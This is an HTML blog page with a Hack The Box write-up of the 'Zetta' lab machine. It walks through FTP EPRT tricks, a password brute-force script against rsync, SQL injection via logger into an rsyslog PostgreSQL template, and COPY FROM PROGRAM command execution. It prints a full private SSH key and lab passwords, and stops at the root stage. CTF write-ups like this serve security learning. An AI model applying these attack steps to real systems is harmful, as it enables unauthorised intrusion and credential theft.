@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Hack The Box: Zetta | gr4n173</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="Hack The Box: Zetta" />
+<meta name="author" content="gr4n173>" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="My writeup of Zetta box from Hack The Box." />
+<meta property="og:description" content="My writeup of Zetta box from Hack The Box." />
+<link rel="canonical" href="http://localhost:4000/2020/02/22/htb-zetta.html" />
+<meta property="og:url" content="http://localhost:4000/2020/02/22/htb-zetta.html" />
+<meta property="og:site_name" content="gr4n173" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-02-22T00:00:00+05:45" />
+<script type="application/ld+json">
+{"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020/02/22/htb-zetta.html"},"@type":"BlogPosting","url":"http://localhost:4000/2020/02/22/htb-zetta.html","author":{"@type":"Person","name":"gr4n173>"},"headline":"Hack The Box: Zetta","dateModified":"2020-02-22T00:00:00+05:45","datePublished":"2020-02-22T00:00:00+05:45","description":"My writeup of Zetta box from Hack The Box.","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/public/images/blackflag.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="gr4n173" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">gr4n173<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/"><i class="fab fa-twitter"></i></a><a class="color-red-hover" href="https://gr4n173.github.io"><i class="fab fa-itch-io"></i></a><a class="color-purple-hover" href="https://github.com/gr4n173"><i class="fab fa-github"></i></a><a class="color-blue-hover" href="https://www.facebook.com/profile.php?id=100038644863435"><i class="fab fa-facebook"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/680705408297730058"><i class="fab fa-discord"></i></a><a class="color-red-hover" href="mailto:me.gr4n173@protonmail.com"><i class="fab fa-mailchimp"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="author-box">
+
+<img src="https://gravatar.com/avatar/6691d16a4bf77dcf1f54ee766349682a?s=256" class="author-avatar" />
+
+
+Hi there, I am a nerd guy who loves everything in between Internet and Security and reach out to people to teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Reverse Engineering.
+
+</div>
+
+<div class="post">
+  <h1 class="post-title">Hack The Box: Zetta</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/linux/">linux</a>
+      
+      <a class="tag" href="/tag/htb/">htb</a>
+      
+      <a class="tag" href="/tag/ftp/">ftp</a>
+      
+      <a class="tag" href="/tag/postgres/">postgres</a>
+      
+      <a class="tag" href="/tag/rsync/">rsync</a>
+      
+      <a class="tag" href="/tag/ipv6/">ipv6</a>
+      
+      <a class="tag" href="/tag/sqli/">sqli</a>
+      
+      <a class="tag" href="/tag/rce/">rce</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 22 Feb 2020</div>
+  
+  <div class="post-description">My writeup of Zetta box from Hack The Box.</div>
+  
+  <hr />
+<h1 id="htbzetta">HTB:Zetta</h1>
+
+<p>Zetta box was the hardest box till I have done. It falls under linux and hard category. Especially to read the root flag is a quite tough one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag using ipv6 and rsync service by uploading my authorized_keys then I used postgres along with logger to read root.txt .I’ll show all my payload(including that didn’t work in initial deployment to get the root).</p>
+
+<h1 id="box-details">Box Details</h1>
+
+<p><img src="/public/images/description_box.png" alt="description_box" /></p>
+
+<p>In above picture it’s ip is 10.10.10.156, I added it to /etc/hosts as zetta.htb. Let’s solve this box.</p>
+
+<hr />
+
+<h1 id="recon">Recon</h1>
+
+<p>Let’s start with our universal port scanner <code class="highlighter-rouge">nmap</code> to see the open port and service which shows FTP(TCP 21),SSH(TCP 22) and HTTP(TCP 80).</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+root@gr4n173:~<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> nmap.txt 10.10.10.156
+Nmap 7.80 scan initiated Sat Jan 25 22:29:29 2020 as: nmap <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> nmap.txt 10.10.10.156
+Nmap scan report <span class="k">for </span>zetta.htb <span class="o">(</span>10.10.10.156<span class="o">)</span>
+Host is up <span class="o">(</span>0.29s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 filtered ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Pure-FTPd
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nginx
+|_http-title: Ze::a Share
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done </span>at Sat Jan 25 22:30:28 2020 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>59.55 seconds
+
+</code></pre></div></div>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p><strong><em>zetta.htb</em></strong></p>
+
+<p>After I noticed port 80 opened I visited that site and got this as output.</p>
+
+<p><img src="/public/images/front_page.jpg" alt="front_page" /></p>
+
+<p>Then, I searched every part of this website and found something interesting things in</p>
+
+<blockquote>
+  <p>STUFF TO DO<br />
+Native FTP We support native FTP with FXP enabled. We also support RFC2428.</p>
+</blockquote>
+
+<p>and also the credentials username/password for FTP service as below.
+<img src="/public/images/ftp_details.jpg" alt="ftp_details" /></p>
+
+<h3 id="ftp">FTP</h3>
+
+<p>With this detail I m into the FTP server now as.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n173:~$ ftp zetta.htb
+Connected to zetta.htb.
+220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
+220-You are user number 1 of 500 allowed.
+220-Local time is now 08:23. Server port: 21.
+220-This is a private system - No anonymous login
+220-IPv6 connections are also welcome on this server.
+220 You will be disconnected after 15 minutes of inactivity.
+Name (zetta.htb:bikram): b6xsE32RXmPtAkGvDMpbWK7LCrC3r1SP
+331 User b6xsE32RXmPtAkGvDMpbWK7LCrC3r1SP OK. Password required
+Password:
+230-This server supports FXP transfers
+230-OK. Current restricted directory is 
+230-0 files used (0%) - authorized: 10 files
+230 0 Kbytes used (0%) - authorized: 1024 Kb
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; 
+
+</code></pre></div></div>
+<p>here you can see FXP transfers supports so I used this and got IPV6 from IPV4. If you are familiar with this then you can skip this blog but if you are unknown about this IPV6 and want to know how I got that then you can have a look at this <a href="https://tools.ietf.org/html/rfc2428">RFC2428</a>.</p>
+
+<p>At first I had set tcpdump listner as</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n173:~$ sudo tcpdump -lni tun0 -vvvvvvvv ip6
+tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+
+</code></pre></div></div>
+<p>Now using this commands:-</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; quote EPRT |1|10.10.10.156|2222|
+200-FXP transfer: from 10.10.16.25 to 10.10.10.156
+200 PORT command successful
+ftp&gt; quote EPRT |2|2001:41d0:52:a00::e66|2222|
+200-FXP transfer: from 10.10.10.156 to 2001:41d0:52:a00::e66%176
+200 PORT command successful
+ftp&gt; quote EPRT |1|10.10.10.156|2222|
+200-FXP transfer: from 2001:41d0:52:a00::e66%176 to 10.10.10.156
+200 PORT command successful
+ftp&gt; quote EPRT |2|dead:beef:2::11df|2222|
+200-FXP transfer: from 10.10.10.156 to dead:beef:2::11df%160
+200 PORT command successful
+ftp&gt; LIST
+?Invalid command
+ftp&gt; quote LIST
+425 Could not open data connection to port 2222: Connection refused
+ftp&gt;
+
+</code></pre></div></div>
+<p>from first command</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>quote EPRT |1|10.10.10.156|2222|
+quote EPRT |2|2001:41d0:52:a00::e66|2222|
+</code></pre></div></div>
+<p>this specifies server should use IPV4 to open a data connection to host of zetta.htb on port 2222 and similar for second command IP6 . Now in third command IPV4 is activated again and IPV6 of my own ip which I got from <code class="highlighter-rouge">ifconfig</code> is used.</p>
+
+<p>This was I got IPV6 as <em><strong>dead:beef::250:56ff:febd:a9a4</strong></em></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n173:~$ sudo tcpdump -lni tun0 -vvvvvvvv ip6
+tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+21:57:25.140243 IP6 (flowlabel 0x924d3, hlim 63, next-header TCP (6) payload length: 40) dead:beef::250:56ff:febd:a9a4.51208 &gt; dead:beef:2::11df.2222: Flags [S], cksum 0x9b6f (correct),
+seq 2652376284, win 28800, options [mss 1337,sackOK,TS val 1847133177 ecr 0,nop,wscale 7], length 0
+21:57:25.140287 IP6 (flowlabel 0x55bf9, hlim 64, next-header TCP (6) payload length: 20) dead:beef:2::11df.2222 &gt; _dead:beef::250:56ff:febd:a9a4_.51208: Flags [R.], cksum 0xe556 (correct),
+seq 0, ack 2652376285, win 0, length 0
+
+</code></pre></div></div>
+<p>I pinged to this IPV6 and I got pinged back which indicates it was working fine. Now I tried again with nmap for IP6 and got this with rsync service at port 8730 as</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n173:~$sudo nmap -sV -sC -6 dead:beef::250:56ff:febd:a9a4 -p 1-10000
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 22:23 +0545
+Nmap scan report for dead:beef::250:56ff:febd:a9a4
+Host is up (0.28s latency).
+Not shown: 9996 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     Pure-FTPd
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA)
+|   256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA)
+|_  256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519)
+80/tcp   open  http    nginx
+|_http-title: Ze::a Share
+8730/tcp open  rsync   (protocol version 31)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| address-info: 
+|   IPv6 EUI-64: 
+|     MAC address: 
+|       address: 00:50:56:bd:a9:a4
+|_      manuf: VMware
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 320.92 seconds
+</code></pre></div></div>
+<h3 id="rsync--authorized_keys--usertxt">Rsync-&gt; authorized_keys-&gt; User.txt</h3>
+
+<p>I googled and read everything regarding the service rsync and made some script with nmap as</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n173:~$ sudo nmap -sV -6 --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 dead:beef::250:56ff:febd:a9a4
+</code></pre></div></div>
+<p>but this didn’t work though so I searched other way to get remote rsync to the server and finally this worked for me.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> root@gr4n173:~$rsync -av rsync://[dead:beef::250:56ff:febd:a9a4]:8730/etc/rsyncd.conf  /tmp/rsyncd.conf 
+</code></pre></div></div>
+
+<h4 id="script-in-python">Script in Python</h4>
+
+<p>From here I got username <em>roy</em> now, I had to crack password of user roy. For that, I had wrote an script in python using pexpect to sending and receiving the files over socket. You can download script from <a href="https://">here</a></p>
+
+<pre><code class="language-`">#!/bin/python3
+
+import pexpect
+p=open('/usr/share/wordlists/rockyou.txt','r')
+for x in p:
+
+    login = pexpect.spawn('rsync -6 -rdt rsync://roy@[dead:beef::250:56ff:febd:a9a4]:8730/home_roy/.ssh ssh')
+    login.expect('Password:')
+    login.sendline(x)
+    if "auth failed on module" not in login.read():
+       break
+    else:
+       print(x)
+       
+</code></pre>
+<p>from here I got the password of user roy as :- computer
+Now I tried to download the id_rsa key of roy user but that fails since roy didn’t have id_rsa key instead used my own authorized_keys to get the shell of user roy.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> rsync -rdt authorized_keys -6 -rdt rsync://roy@[dead:beef::250:56ff:febd:7d3b]:8730/home_roy/.ssh
+</code></pre></div></div>
+<p>Here now authorized_keys let me to  shell of user roy and also I had used the user roy along with it’s password <em>computer</em>.</p>
+
+<h1 id="shell-as-roy">Shell as roy</h1>
+
+<p>Finally I got the shell of roy and got the <em>user.txt</em> as</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n173:~$ ssh roy@zetta.htb
+Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
+Last login: Sat Feb 15 22:05:58 2020 from 10.10.14.193
+roy@zetta:~$ whoami
+roy
+roy@zetta:~$ ls
+user.txt
+roy@zetta:~$ cat user.txt
+a575bdb*************************
+</code></pre></div></div>
+
+<h1 id="postgresql-exploit"><strong>Postgresql Exploit</strong></h1>
+
+<p>After I got user.txt i.e. roy shell ,I found .tudu.xml file in home directory of roy where many to do list was written.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.......
+
+					<span class="nt">&lt;todo</span> <span class="na">done=</span><span class="s">"no"</span> <span class="na">collapse=</span><span class="s">"no"</span><span class="nt">&gt;</span>                                                                                            
+                                <span class="nt">&lt;title&gt;</span>Check postgresql log for errors after configuration<span class="nt">&lt;/title&gt;</span>                                                    
+                                <span class="nt">&lt;text&gt;</span>                                                                                                                
+<span class="nt">&lt;/text&gt;</span>                                                                                                                                               
+                        <span class="nt">&lt;/todo&gt;</span>                                                                                                                       
+                        <span class="nt">&lt;todo</span> <span class="na">done=</span><span class="s">"yes"</span> <span class="na">collapse=</span><span class="s">"no"</span><span class="nt">&gt;</span>
+                                <span class="nt">&lt;title&gt;</span>Prototype/test DB push of syslog events<span class="nt">&lt;/title&gt;</span>
+                                <span class="nt">&lt;text&gt;</span> 
+<span class="nt">&lt;/text&gt;</span>
+                        <span class="nt">&lt;/todo&gt;</span>
+                        <span class="nt">&lt;todo</span> <span class="na">done=</span><span class="s">"no"</span> <span class="na">collapse=</span><span class="s">"no"</span><span class="nt">&gt;</span>
+                                <span class="nt">&lt;title&gt;</span>Testing<span class="nt">&lt;/title&gt;</span>
+                                <span class="nt">&lt;text&gt;</span> 
+<span class="nt">&lt;/text&gt;</span>
+                        <span class="nt">&lt;/todo&gt;</span>
+                        <span class="nt">&lt;todo</span> <span class="na">done=</span><span class="s">"no"</span> <span class="na">collapse=</span><span class="s">"no"</span><span class="nt">&gt;</span>
+                                <span class="nt">&lt;title&gt;</span>Rework syslog configuration to push all events to the DB<span class="nt">&lt;/title&gt;</span>
+                                <span class="nt">&lt;text&gt;</span> 
+<span class="nt">&lt;/text&gt;</span>
+                        <span class="nt">&lt;/todo&gt;</span>
+                        <span class="nt">&lt;todo</span> <span class="na">done=</span><span class="s">"no"</span> <span class="na">collapse=</span><span class="s">"no"</span><span class="nt">&gt;</span>
+                                <span class="nt">&lt;title&gt;</span>Find/write GUI for syslog-db access/view<span class="nt">&lt;/title&gt;</span>
+                                <span class="nt">&lt;text&gt;</span> 
+........
+
+</code></pre></div></div>
+
+<p>From above todo list I had to check postgresql log for errors, Hence it confirmed me to exploit log. After a lot of enumeration I found something fishy in <code class="highlighter-rouge">/etc/rsyslog.d/.git</code> where I found <em>pgsql.conf</em> but I wasn’t able to cat that file due to permission error. So I used other ways to read that file. For that I used git command since, there is .git repo in that directory as</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>roy@zetta:/tmp$ cd /etc/rsyslog.d/
+roy@zetta:/etc/rsyslog.d$ git clone /etc/rsyslog.d/.git /tmp/.git
+Cloning into '/tmp/.git'...
+done.
+roy@zetta:/etc/rsyslog.d$ ls -al /tmp/.git/
+total 16
+drwxr-xr-x  3 roy  roy  4096 Feb 20 06:21 .
+drwxrwxrwt 11 root root 4096 Feb 20 06:21 ..
+drwxr-xr-x  8 roy  roy  4096 Feb 20 06:21 .git
+-rw-r--r--  1 roy  roy   807 Feb 20 06:21 pgsql.conf
+</code></pre></div></div>
+<p>Now I was able to cat that file and where the file indicates there is sql injection one of the template and gives more information about local logging. Logging was new for me so googled and collected information about it. If you have known about logging then you can escape this blog but if you are unknown about logging in syslog then you can click <a href="http://nginx.org/en/docs/syslog.html">here</a>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>roy@zetta:/tmp/.git$ cat pgsql.conf
+### Configuration file for rsyslog-pgsql
+### Changes are preserved
+# https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html
+# Used default template from documentation/source but adapted table
+# name to syslog_lines so the Ruby on Rails application Maurice is
+# coding can use this as SyslogLine object.
+# template(name="sql-syslog" type="list" option.sql="on") {
+  constant(value="INSERT INTO syslog_lines (message, devicereportedtime) values ('")
+  property(name="msg")
+  constant(value="','")
+  property(name="timereported" dateformat="pgsql" date.inUTC="on")
+  constant(value="')")
+}
+# load module
+module(load="ompgsql")
+
+#Only forward local7.info for testing.
+local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")
+</code></pre></div></div>
+<p>Since there was sql in syslog postgres I tried to get the shell of postgres for that I used command as</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>roy@zetta:/tmp/.git$ psql -d syslog
+psql: FATAL:  role "roy" does not exist
+</code></pre></div></div>
+<p>where -d, –dbname=DBNAME   database name to connect to (default: “roy”)</p>
+
+<p>So,for that I tried to create the user roy using postgres, logger and sql injection so my payload was</p>
+
+<h3 id="logger---sql---superuser-roy">Logger -&gt; Sql -&gt; Superuser roy</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>roy@zetta:~$ logger -p local7.info "aaa',current_timestamp);CREATE USER roy; --"
+roy@zetta:~$ psql -d syslog
+psql (11.4 (Debian 11.4-1))
+Type "help" for help.
+
+syslog=&gt;
+</code></pre></div></div>
+<p>After that, I created the user roy for syslog and used the postgres command to see what things are inside the syslog database. Since this box got postgres I googled for latest exploit of postgresql and got <em>COPY FROM PROGRAM Command Execution vulnerability</em>. For more info about it you can click <a href="https://www.exploit-db.com/exploits/46813">here</a>.</p>
+
+<p>And instead of using Metasploit I used the manual ways to exploit this vulnerability for that I used this blog <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/authenticated-arbitrary-command-execution-on-postgresql-9-3/">here</a>.</p>
+
+<p>On reading blogs to use <em>COPY</em> command user must be superuser only then I can exploit it. For that I changed the user <em>roy</em> to superuser as</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>roy@zetta:~$ logger -p local7.info "aaa',current_timestamp);ALTER USER roy WITH SUPERUSER; --"                                                             
+</code></pre></div></div>
+
+<p>Now I exploit the postgres and able to run the command injection in syslog database. At my first attempt I was interrupted and unable to run command in postgres but after 2nd/3rd attempt I used (<code class="highlighter-rouge">$$</code>)Dollar-quoting for escaping single quotes in postgres to exploit command injection.</p>
+
+<h3 id="command-injection---postgres-shell">Command Injection -&gt; Postgres shell.</h3>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>syslog=# CREATE TABLE RCE(RCE text);
+CREATE TABLE
+syslog=# COPY RCE FROM PROGRAM $$id$$; 
+COPY 1
+syslog=# SELECT * FROM RCE;
+                                  rce                                   
+------------------------------------------------------------------------
+ postgres
+ uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
+(2 rows)
+</code></pre></div></div>
+<p>Now I have to get the postgres shell for that I should have id_rsa key. Now for that I found the <code class="highlighter-rouge">id_rsa</code> key of postgres in directory <code class="highlighter-rouge">/var/lib/postgres/.ssh/</code>
+So for that I used that cat command in command injection and able to cat the RSA key.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>syslog=# COPY RCE FROM PROGRAM $$cat ../../.ssh/id_rsa$$;                                                                                                
+COPY 6                                                                                                                                                
+syslog=# SELECT * FROM RCE;                                                                                                                           
+                                     rce                                                                                                              
+------------------------------------------------------------------------------
+ postgres
+ uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
+ /var/lib/postgresql/11/main
+ total 20
+ drwxr-xr-x  4 postgres postgres 4096 Jul 27  2019 .
+ drwxr-xr-x 27 root     root     4096 Aug 27 05:39 ..
+ drwxr-xr-x  3 postgres postgres 4096 Jul 27  2019 11
+ lrwxrwxrwx  1 root     root        9 Jul 27  2019 .bash_history -&gt; /dev/null
+ -rw-------  1 postgres postgres  744 Jul 27  2019 .psql_history
+ drwx------  2 postgres postgres 4096 Jul 27  2019 .ssh
+ total 20
+ drwx------ 2 postgres postgres 4096 Jul 27  2019 .
+ drwxr-xr-x 4 postgres postgres 4096 Jul 27  2019 ..
+ -rw------- 1 postgres postgres  747 Jul 27  2019 authorized_keys
+ -rw------- 1 postgres postgres 3389 Jul 27  2019 id_rsa
+ -rw-r--r-- 1 postgres postgres  747 Jul 27  2019 id_rsa.pub
+ -----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</code></pre></div></div>
+
+<p>After that I copied <code class="highlighter-rouge">id_rsa</code> key to name <code class="highlighter-rouge">id_rsa</code> key in my local machine and used. This was I got postgres shell</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n173:~$ ssh -i id_rsa postgres@zetta.htb
+Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
+postgres@zetta:~$ whoami
+postgres
+postgres@zetta:~$ id
+uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
+postgres@zetta:~$
+</code></pre></div></div>
+
+<h1 id="postgres---root">Postgres -&gt; Root</h1>
+
+<p>Now I got the shell of user postgres and searched its home directory and got .psql_history.</p>
+
